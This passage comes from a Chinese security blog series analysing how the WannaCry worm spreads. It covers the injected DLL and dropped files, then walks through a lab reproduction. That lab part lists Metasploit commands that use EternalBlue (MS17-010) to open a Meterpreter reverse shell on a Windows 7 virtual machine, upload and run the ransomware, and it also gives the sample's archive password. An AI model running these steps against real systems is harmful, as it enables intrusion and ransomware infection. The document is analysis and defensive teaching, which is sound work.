![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK4CVIVXd5NUW9BJWYxIhxNpiaNE31rOpwlEsQIMjQQZZ2edblhibhp4CQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKXw0NZVcpBLO9clVEkuCtVsbMKrJBrXnib5cPE40PkTicQ2AJLN6Jh9Kg/640?wx_fmt=png)

内核部分的注入代码主要流程就分析完了，到用户层的 shellcode 自己实现的一个 pe loader 而没有使用 LoadLibary，这样使得注入更加隐蔽，查询 PEB_LDR_DATA 的也查不到被注入了 dll。

16.dll 导出及分析
------------

shellcode 使用 APC 注入将生成的 dll 注入到系统进程 lsass.exe，导出的 dll 文件如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKJurtclxKERSKpY8w98UiaR47nWtfvLxkRBzwrWPRYSFUL07t23gkVpg/640?wx_fmt=png)

火绒剑检测结果如下，通过 APC 注入将生成的 dll 注入到系统进程 lsass.exe，接着释放资源 mssecsvc.exe，最后释放勒索程序 tasksche.exe。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKvsZS6FncuCiaRL1UcnvX3Ahy8lnjP3VvtW6EsIvtWJHO2z0uFzIzZFw/640?wx_fmt=png)

17. 释放资源 tasksche.exe
---------------------

dll 具有一个导出函数 PlayGame，它会将母体程序释放到被攻击的计算机，保存为 C:\WINDOWS\mssecsvc.exe 并执行。

下面是作者分析导出的 dll 静态代码，主函数 PlayGame。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKlhjtVRibx9IpiaIc8EfDbCl1Zrdrw7icXiaEHicyT2WiaHJxgCgQe68icgicZQ/640?wx_fmt=png)

PlayGame 包括两个核心函数：sub_180001014 和 sub_1800010F8。

*   sub_180001014：释放资源
    
*   sub_1800010F8：运行文件
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKiau5ewppr2GA1xVODYrXNgibibC5eNJnTJGm2uGXYohbwv56CdUBaBe8g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKSgesJGZicqSwavTiaVibq16k2GLYOia6Byzm9MicibhREEcBUfQvE3nJIW7g/640?wx_fmt=png)

最后释放资源 tasksche.exe(勒索加密程序) 到 C:\WINDOWS 目录下，并将其启动。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKcmCFrzeIk09Trv73BO9KOwPSCMWEkMlSa0SWBayRvg9IpkcHh34H7w/640?wx_fmt=png)

被攻击的计算机包含蠕虫的完整功能，除了会被勒索，还会继续使用 MS17-010 漏洞进行传播，这种传播呈几何级向外扩张，也是该蠕虫短时间内大规模爆发的主要原因。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKFmcMgYmoxoGEnRnu9Qy7S9rQzcrDiaibZlnedoGff7uHicbfM7UK7fmibg/640?wx_fmt=png)

18. 勒索行为
--------

> 勒索行为之前的文章已经进行了还原

运行病毒程序后的界面如下图所示，已经成功被勒索。再次强调，所有代码必须在虚拟机中执行，并且关闭文件共享。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKQRJrpmnwrReeibas7Eq5EZmictU8uCkAzdHIxQu4vbAG3nHpkqf6Eib7A/640?wx_fmt=png)

样本的解压密码是 WNcry@2ol7，通过资源工具也可以查看到。解压后的文件结构如下：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKICqjS9h6Le0gA58CeSsQIAia3KbEUnC3LPzUwlmT1hiazAEtFHMdWX2Q/640?wx_fmt=png)

msg 文件夹下就是所有的语言包。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKggpLfZYeS9AKXIicAAJiaVuedh5KyLeztAw0PSWLAmB44IkiczXSz0e9Q/640?wx_fmt=png)

其他文件内容如下，下一篇文章会详细介绍勒索原理。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK2aHIXpQhYweEia2P9ubQicrRX7RE0rsWYn1picX6s1XAOOIs8IRiax0gew/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAK5eP7zslrOibJoEMMVqdtLoibzkLNppgUl92yqVhOp4EpZyl2egsc1vTg/640?wx_fmt=png)

四. WannaCry 实验复现
================

1. 实验环境搭建
---------

实验环境：

*   攻击机：
    
    Kali-linux-2019.2 IP:192.168.44.138
    
*   受害主机：
    
    Win7 64 位 IP:192.168.44.147
    

实验工具：

*   metasploit
    
*   MS17-010
    
*   Wcry.exe
    

实验步骤：

*   配置 Windows Server 2003、Kali、Windows7 实验环境
    
*   Kali 检测受害主机 445 端口（SMB 协议）是否开启
    
*   运行 EternalBlue 永恒之蓝漏洞 (MS17-010) 反弹 shell
    
*   上传勒索病毒 wcry.exe 并运行
    
*   实现勒索和文件加密
    

切记、切记、切记：实验复现过程中必须在虚拟机中完成，运行前关闭虚拟机 Win7 文件共享，真机上一旦被感染你就真的只能想哭了（wannacry）。同时，该实验仅作病毒机理和防御分析，了解原理更好地保护计算机，切勿攻击他人，否则后果自负。

第一步，创建虚拟机并安装 Windows7 x64 位操作系统。Win7 设置开启 445 端口，同时关闭防火墙。注意，关闭虚拟机文件共享功能。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh01n5T4AvR6mbIIuzibL246D1aUicf57dXVnT32IN9sc1Io9Ctibgl0iaOicpA/640?wx_fmt=png)

第二步，保证攻击机和受害机相互通讯，均在同一个局域网中。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh01Vr1ibqIxSaibZ9sDDsSA4DPT46DZLA4HSeuzvCdicHUg9rqLZhAK6yuFg/640?wx_fmt=png)

2.Kali 利用 MS17-010 反弹 Shell
---------------------------

第一步，扫描靶机是否开启 445 端口。

*   nmap -sS 192.168.44.147
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh01ENvYUZE58WuKsUJzqqFuE2BTKaYHmUJnYJKh9sFpTsKlTAQvibMNdeA/640?wx_fmt=png)

第二步，打开 msfconsole 并查询 MS17-010 漏洞模块。  
这里有各种 MS17-010 漏洞版本，我们根据目标系统选择编号为 3 的版本。推荐读者看看 NSA 泄露的方程式工具包，其中永恒之蓝（eternalblue）就是著名的漏洞。

*   msfconsole
    
*   search ms17-010
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh01dPOz4WbyHuSHFCNFu0GsYKib4ZVzIe5qMibwTReMic2FZb9PPP3J7btMQ/640?wx_fmt=png)

第三步，利用永恒之蓝漏洞并设置参数。

*   use exploit/windows/smb/
    
    ms17_010_eternalblue
    
    利用永恒之蓝漏洞
    
*   set payload windows/x64/
    
    meterpreter/reverse_tcp
    
    设置 payload
    
*   set LHOST 192.168.44.138
    
    设置本机 IP 地址
    
*   set RHOSTS 192.168.44.147
    
    设置受害主机 IP
    
*   set RPORT 445
    
    设置端口 445，注意该端口共享功能是高危漏洞端口，包括之前分享的 139、3389 等
    
*   exploit
    
    利用漏洞
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh01pZj58EczCwmMC64I4WcC3w3VnN8BTp7cwRchmWQTMUhfjD8I5a5dBg/640?wx_fmt=png)

第四步，成功获取 Win7 系统管理员权限。

*   getuid  
    返回系统管理员权限
    
*   pwd、ls  
    查看当前路径及目录
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh01r4H7BibEbFXnOkOLEibHxb2937uiaNDHlz0H3McupxfE3IzajEM26U9AA/640?wx_fmt=png)

第五步，上传勒索病毒至 Win7 系统。再次强调，虚拟机中运行该实验，并且关闭文件共享功能。

*   shell
    
*   upload /root/wcry.exe c:\
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh01wuRyjwKJNrZ1A4V3SWHf31BlJXaibl5ccK6vQlepXnkDSPpgS4mdj2w/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh01NLqerUibxiaJ2fFB7IyYjSce3ibaHYIYyQMcGiaPyvCAvicnZ9viaYTM0hgg/640?wx_fmt=png)

第六步，运行勒索病毒，实验复现成功。  
运行前的受害主机界面如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh01UEt9T8luQkhB2vgdoBr43fPB2CTXnDwYz8ax8wcXywZcMzBYc61Mng/640?wx_fmt=png)

再次强调，所有代码必须在虚拟机中执行，并且关闭文件共享。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh010m63UondMtdvicreXVia4lhKnegoQmic7x71gULcbkg6qbSNgmUGdLw4w/640?wx_fmt=png)

加密系统中的文件，被加密的文件后缀名统一修改为 “.WNCRY”。其原理第二部分详细介绍。

*   b.wnry: 中招敲诈者后桌面壁纸
    
*   c.wnry: 配置文件，包含洋葱域名、比特币地址、tor 下载地址等
    
*   f.wnry: 可免支付解密的文件列表
    
*   r.wnry: 提示文件，包含中招提示信息
    
*   s.wnry: zip 文件，包含 Tor 客户端
    
*   t.wnry: 测试文件
    
*   u.wnry: 解密程序
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh01iaPAS9rnzFbLT26SqPgBMiajxCPDjicsdDoSBFxs1HiaTSHdI4kS0qLYvg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh01UKHMiamEoagCJ286kFdgwsTicbtickVPIicvCotRIkwsJhxyibZu84crbHw/640?wx_fmt=png)

四. 防御措施
=======

勒索软件防御常见的措施如下：

*   **开启系统防火墙**
    
*   **关闭 445、139 等端口连接**
    
*   **开启系统自动更新，下载并更新补丁，及时修复漏洞**
    
*   **安装安全软件，开启主动防御拦截查杀**
    
*   **如非服务需要，建议把高危漏洞的端口都关闭，比如 138、139、445、3389 等**
    

由于 WannaCry 勒索病毒主要通过 445 端口入侵计算机，关闭的方法如下：

*   控制面板–>windows 防火墙—> 高级选项–> 入站规则
    
*   新建规则–> 选择端口–> 指定端口号 445
    
*   选择阻止连接–> 配置文件全选–> 规则名称–> 成功关闭
    

实验在虚拟机中进行，也需要关闭共享文件夹功能，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROaxpomIuWfznOsB65vxh01n5T4AvR6mbIIuzibL246D1aUicf57dXVnT32IN9sc1Io9Ctibgl0iaOicpA/640?wx_fmt=png)

五. 总结
=====

写到这里，这篇文章就介绍完毕。主要讲解了 WannaCry 蠕虫的传播机制，也是作者一个月的研究成果，感觉是全网 WannaCry 蠕虫传播部分最详细的一篇文章了。最后，感觉自己真的好菜，但也需要加油，希望您喜欢这篇文章~

*   WannaCry 蠕虫传播流程
    
*   程序入口 Start
    
*   域名开关 WinMain
    
*   参数判断 sub_408090
    
*   蠕虫安装流程 sub_407F20
    
*   蠕虫服务传播流程 sub_4080000
    
*   蠕虫初始化操作 sub_407B90
    
*   局域网传播 sub_407720
    
*   公网传播 sub_407840
    
*   漏洞检测及创建通信连接 sub_407540
    
*   发送 SMB 数据包 sub_4072A0
    
*   获取 Payload（dll+shellcode）
    
*   提取 shellcode
    
*   shellcode 分析之安装后门
    
*   shellcode 分析之 APC 注入
    
*   dll 导出及分析
    
*   释放资源 tasksche.exe
    
*   勒索行为
    

原文地址：

*   https://blog.csdn.net/Eastmount/article/details/114649732
    

这篇文章中如果存在一些不足，还请海涵。作者作为网络安全初学者的慢慢成长路吧！希望未来能更透彻撰写相关文章。同时非常感谢参考文献中的安全大佬们的文章分享，深知自己很菜，得努力前行。

欢迎大家讨论，是否觉得这系列文章帮助到您！任何建议都可以评论告知读者，共勉。

前文回顾（下面的超链接可以点击喔）：

*   [[系统安全] 一. 什么是逆向分析、逆向分析应用及经典扫雷游戏逆向](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484670&idx=1&sn=c31b15b73f27a7ce44ae1350e7f708a2&chksm=cfccb433f8bb3d25c25f044caac29d358fe686602011d8e4cbdc504e3a587e756215ce051819&scene=21#wechat_redirect)
    
*   [[系统安全] 二. 如何学好逆向分析及吕布传游戏逆向案例](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484756&idx=1&sn=ef95ff95474c51fa2bd4b9b4847ebb54&chksm=cfccb599f8bb3c8fa4852416cff6695fc8dcc9aadb3295c7249c12c03cad4c146a93e6250d56&scene=21#wechat_redirect)
    
*   [[系统安全] 三. IDA Pro 反汇编工具初识及逆向工程解密实战](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484812&idx=1&sn=9b77853a5b9da0f7a688e592dba3ddba&chksm=cfccb541f8bb3c57faffc7661a452238debe09cc7a57ae2d9e9d835d6520ee441bfd9d5ad119&scene=21#wechat_redirect)
    
*   [[系统安全] 四. OllyDbg 动态分析工具基础用法及 Crakeme 逆向破解](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484950&idx=1&sn=07d8f0b20f599586ef06035354b14630&chksm=cfccb6dbf8bb3fcd6d2efcc7b6757fabd8015d86f43e3bc8ae6cb9367d19492aec881374fca2&scene=21#wechat_redirect)
    
*   [[系统安全] 五. OllyDbg 和 Cheat Engine 工具逆向分析植物大战僵尸游戏](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485043&idx=1&sn=028c702990f722d087c6c349fb34f5fb&chksm=cfccb6bef8bb3fa8882994f7412db6b769d382abbafa6b5b3bd1b5ae62dffa20e81c7170ecb4&scene=21#wechat_redirect)
    
*   [[系统安全] 六. 逆向分析之条件语句和循环语句源码还原及流程控制](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485936&idx=1&sn=b1c282021280bb24646a9bf7c0f1fa6a&chksm=cfccb93df8bb302b51ae1026dba4f8839a1c68690df0e8da3242e9c1ead0182bf6c34dd44ada&scene=21#wechat_redirect)
    
*   [[系统安全] 七. 逆向分析之 PE 病毒原理、C++ 实现文件加解密及 OllyDbg 逆向](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485996&idx=1&sn=d5e323f16ce0b3d88c678a1fc1848596&chksm=cfccbae1f8bb33f7fad687d17ba7c10312bf2d756e460217a5d60ef2af0c012336292918128d&scene=21#wechat_redirect)
    
*   [[系统安全] 八. Windows 漏洞利用之 CVE-2019-0708 复现及蓝屏攻击](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486024&idx=1&sn=102ace20c2b15f4e7a9f910b56b84aec&chksm=cfccba85f8bb33939ac7e99cae23d1b6da5a0db4e6ff8bc7535a77a46a4204855de41aa446dd&scene=21#wechat_redirect)
    
*   [[系统安全] 九. Windows 漏洞利用之 MS08-067 远程代码执行漏洞复现及深度提权](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486057&idx=1&sn=7e7899b9285ac04f0d9745b4c455b005&chksm=cfccbaa4f8bb33b25ffcd780764ad86dc63edc7dd56d09e466254f6277851b5a4a545bb209a4&scene=21#wechat_redirect)
    
*   [[系统安全] 十. Windows 漏洞利用之 SMBv3 服务远程代码执行漏洞（CVE-2020-0796）复现](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486111&idx=1&sn=e2129fc8efa79d2356c3a2deec6d52a1&chksm=cfccba52f8bb3344479fa8d201494f88ac1b0cee3e0786797dd09a17c5f4aa4a5627fd0afef0&scene=21#wechat_redirect)
    
*   [[系统安全] 十一. 那些年的熊猫烧香及 PE 病毒行为机理分析](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486188&idx=1&sn=34a1d3f2d6880dfd60917b84d3efaa5a&chksm=cfccba21f8bb3337b45cc0fb98af3ab6a1333219fe2a06d3c3c8e38b996e1039e5b0f8d14f24&scene=21#wechat_redirect)
    
*   [[系统安全] 十二. 熊猫烧香病毒 IDA 和 OD 逆向分析（上）病毒初始化](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486260&idx=1&sn=0760360d286782209e9f93d37c177c73&chksm=cfccbbf9f8bb32ef5e54058ded6072a248e3156be64213a238b47b5fa65b6909889ab0c9b7c5&scene=21#wechat_redirect)
    
*   [[系统安全] 十三. 熊猫烧香病毒 IDA 和 OD 逆向分析（中）病毒释放机理](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486423&idx=1&sn=43f77342f8900b481eaa536b9e81f737&chksm=cfccbb1af8bb320ccc6f1bd93e358b916ccb6313f9bbdcf1d9c31deebf16a2e643ce0e121113&scene=21#wechat_redirect)
    
*   [[系统安全] 十四. 熊猫烧香病毒 IDA 和 OD 逆向分析（下）病毒感染配置](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486580&idx=1&sn=20b672097bf0be1fbdf5952bb53b23a6&chksm=cfccbcb9f8bb35affbc611fc92875f9250060914d94fa1d9a7c2b9e9482fd4a50bbb33ebc42f&scene=21#wechat_redirect)
    
*   [[系统安全] 十五. Chrome 密码保存功能渗透解析、Chrome 蓝屏漏洞及音乐软件漏洞复现](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486662&idx=1&sn=6506a733804564137d40c7c070287590&chksm=cfccbc0bf8bb351d1a82737e5dc310c048f80fb5fcfe3317c7bc1b38ac6b52de60923cb92ba7&scene=21#wechat_redirect)
    
*   [[系统安全] 十六. PE 文件逆向基础知识 (PE 解析、PE 编辑工具和 PE 修改)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486866&idx=1&sn=cd3bc433c0a6a7b1f8bcaa4295cf65ae&chksm=cfccbd5ff8bb34496b9dc20b2fd304ce1d1194fd076902127a6817362b3c52afc056126ca0ba&scene=21#wechat_redirect)
    
*   [[系统安全] 十七. Windows PE 病毒概念、分类及感染方式详解](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247487219&idx=1&sn=1e123c330cb0499400d5529cbd5f47f3&chksm=cfccbe3ef8bb3728118a0aab982a56b3ea66f320a221c6a318263104a35f5aee8d3545612683&scene=21#wechat_redirect)
    
*   [[系统安全] 十八. 病毒攻防机理及 WinRAR 恶意劫持漏洞 (bat 病毒、自启动、蓝屏攻击)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247487311&idx=1&sn=95211524641975c5a5093f07df5e6ab2&chksm=cfccbf82f8bb36940f26a26bd8ed5870088823a9a97ccd81e699ed82aca3f579231c9b3e987e&scene=21#wechat_redirect)
    
*   [[系统安全] 十九. 宏病毒之入门基础、防御措施、自发邮件及 APT28 宏样本分析](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247487459&idx=1&sn=87d6296402fdb71f5dbb5a42f9bb6597&chksm=cfccbf2ef8bb363893337b31e8985361624280b90ee6ca65c2da67916fc78ba66f059a24e589&scene=21#wechat_redirect)
    
*   [[系统安全] 二十. PE 数字签名之 (上) 什么是数字签名及 Signtool 签名工具详解](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247487583&idx=1&sn=80203f44662f8e3902779c81669f33d5&chksm=cfcca092f8bb29844911039ef76fe74f5d746518fa8b617c704ea4f59534ea520521b1b3e673&scene=21#wechat_redirect)
    
*   [[系统安全] 二十一. PE 数字签名之 (中)Signcode、PEView、010Editor、Asn1View 工具用法](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247487960&idx=1&sn=02296bc6cdabb7ffba9acf1c6a922fc0&chksm=cfcca115f8bb2803860941471cc999b5d9c42401daa51ebf0b14c09d914f4c5b23d26d565182&scene=21#wechat_redirect)
    
*   [[系统安全] 二十二. PE 数字签名之 (下) 微软证书漏洞 CVE-2020-0601 复现及 Windows 验证机制分析](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488157&idx=1&sn=a1c920ff7151debc50f23f15b3c28c4e&chksm=cfcca250f8bb2b4604700ffa5ca4d89f3210a9522ea35a6a45f528f14f5bfde269cc51600fa8&scene=21#wechat_redirect)
    
*   [[系统安全] 二十三. 逆向分析之 OllyDbg 动态调试复习及 TraceMe 案例分析](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488457&idx=1&sn=408c70bb9a68f60d1eccd081ef2b4792&chksm=cfcca304f8bb2a128b1553f7e3279351c6b439ae872c97c2e23906d8dd9535b3a2d4c764f379&scene=21#wechat_redirect)
    
*   [[系统安全] 二十四. 逆向分析之 OllyDbg 调试 INT3 断点、反调试、硬件断点与内存断点](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247488792&idx=1&sn=1cb999b467624fac46d0920219bc93a2&chksm=cfcca5d5f8bb2cc3f06aa410bc22037827b48e0bbd9c77ef5bab59d6df072c451e9682f11397&scene=21#wechat_redirect)
    
*   [[系统安全] 二十五. WannaCry 勒索病毒分析 (1)Python 复现永恒之蓝漏洞实现勒索加密](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489320&idx=1&sn=378d4415bf4fd39b98aabe46c3dcf882&chksm=cfcca7e5f8bb2ef3ee0b4b0683c8b0bf2dc28622c6428d9e260b589184a73e02b4707a68f1d9&scene=21#wechat_redirect)
    
*   [[系统安全] 二十六. WannaCry 勒索病毒分析 (2)MS17-010 漏洞利用及解析](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489377&idx=1&sn=c69a553bba36b0dd0a2fedc0f183dc32&chksm=cfcca7acf8bb2eba99aa0f5e9e2fcd137a49f646b253ce0652d4f5869030ca034683be0aced6&scene=21#wechat_redirect)
    
*   [[系统安全] 二十七. WannaCry 勒索病毒分析 (3) 蠕虫传播机制分析及 IDA 和 OD 逆向](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489613&idx=1&sn=39bf0a6a669d2b6f9839fe6382a8952c&chksm=cfcca880f8bb2196f18d3effd65a079d3486f1a160e65e8fbfddba19d494adfe1873b49f2278&scene=21#wechat_redirect)
    
*   [[系统安全] 二十八. CS 逆向分析 (1) 你的游戏子弹用完了吗？Cheat Engine 工具入门](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247490474&idx=1&sn=f69c10edf37af6ea1b7b2dc18c20f080&chksm=cfccab67f8bb227144a0e6fae078fc870a3b1b4cc6642990782e096c1710f8386ae18adfe031&scene=21#wechat_redirect)
    
*   [[系统安全] 二十九. 外部威胁防护和勒索病毒对抗（深信服视频学习）](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247493046&idx=1&sn=54a8590b40f7bda7321168023de17c77&chksm=cfcf557bf8b8dc6dee05fe45b3102adcc7ded03d59d7af4af878305fd97753e39e6eebc45117&scene=21#wechat_redirect)
    
*   [系统安全] 三十. WannaCry 勒索病毒分析 (4) 全网 “最 “详细的蠕虫传播机制解读  
    

2020 年 8 月 18 新开的 “娜璋 AI 安全之家”，主要围绕 Python 大数据分析、网络空间安全、人工智能、Web 渗透及攻防技术进行讲解，同时分享 CCF、SCI、南核北核论文的算法实现。娜璋之家会更加系统，并重构作者的所有文章，从零讲解 Python 和安全，写了近十年文章，真心想把自己所学所感所做分享出来，还请各位多多指教，真诚邀请您的关注！谢谢。2021 年继续加油！

**晚安女神，爱你和小宝❤**

公众号

(By:Eastmount 2021-07-30 夜于武汉）

参考文献  
为了更好帮助读者，作者将参考文献提前。下面给出下各大安全厂商及安全大佬对 WannaCry 蠕虫分析的文章，强烈推荐大家阅读，作者也吸取了它们的精华，在此感谢。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN8z7nobQhZn6ErJU7fhuAKGsia0Q7NmLmuCXqC6gmibicECst0kFsicAFviaf0n685H4Fw09tJGS2gruw/640?wx_fmt=png)